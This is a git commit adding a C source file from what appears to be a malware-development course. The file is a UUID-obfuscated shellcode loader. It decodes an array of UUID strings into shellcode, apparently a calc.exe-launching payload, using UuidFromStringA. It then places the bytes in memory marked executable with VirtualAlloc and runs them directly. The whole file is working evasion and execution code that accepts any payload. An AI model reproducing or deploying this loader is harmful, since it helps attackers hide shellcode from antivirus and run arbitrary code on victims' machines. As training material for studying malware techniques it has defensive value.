e0bcca31506fd5d6abb61816342e5ac7ab8decbc
e1n <69242462+du4L5ynchE1n@users.noreply.github.com>
2023-09-04 23:54:31 +0800

    Create UUID_Deobfuscate.c

---
+++ basics/Payload_Obfuscation/UUIDFuscation/UUID_Deobfuscate.c
@@ -0,0 +1,101 @@
+// @NUL0x4C | @mrd0x : MalDevAcademy
+
+#include <Windows.h>
+#include <stdio.h>
+
+#define NumberOfElements 17
+
+char* UuidArray[] = {
+		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
+		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
+		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
+		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
+		"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
+		"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
+};
+
+// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
+typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
+	RPC_CSTR	StringUuid,
+	UUID* Uuid
+	);
+
+BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
+
+	PBYTE		pBuffer = NULL,
+				TmpBuffer = NULL;
+
+	SIZE_T		sBuffSize = NULL;
+
+	RPC_STATUS 	STATUS = NULL;
+
+	// Getting UuidFromStringA address from Rpcrt4.dll
+	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
+	if (pUuidFromStringA == NULL) {
+		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Getting the real size of the shellcode which is the number of UUID strings * 16
+	sBuffSize = NmbrOfElements * 16;
+
+	// Allocating memory which will hold the deobfuscated shellcode
+	//pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
+	pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (pBuffer == NULL) {
+		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Setting TmpBuffer to be equal to pBuffer
+	TmpBuffer = pBuffer;
+
+	// Loop through all the UUID strings saved in UuidArray
+	for (int i = 0; i < NmbrOfElements; i++) {
+
+		// Deobfuscating one UUID string at a time
+		// UuidArray[i] is a single UUID string from the array UuidArray
+		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
+			// if it failed
+			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
+			return FALSE;
+		}
+
+		// 16 bytes are written to TmpBuffer at a time
+		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
+		TmpBuffer = (PBYTE)(TmpBuffer + 16);
+
+	}
+
+	*ppDAddress = pBuffer;
+	*pDSize = sBuffSize;
+
+	return TRUE;
+}
+
+
+int main() {
+
+	PBYTE	pDAddress = NULL;
+	SIZE_T	sDSize = NULL;
+
+	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDAddress, &sDSize))
+		return -1;
+
+	printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
+	for (size_t i = 0; i < sDSize; i++) {
+		if (i % 16 == 0)
+			printf("\n\t");
+
+		printf("%0.2X ", pDAddress[i]);
+	}
+
+	(*(VOID(*)()) pDAddress)();
+	// Free the executable buffer
+	VirtualFree(pDAddress, 0, MEM_RELEASE);
+
+	printf("\n\n[#] Press <Enter> To Quit ... ");
+	getchar();
+
+	return 0;
+}
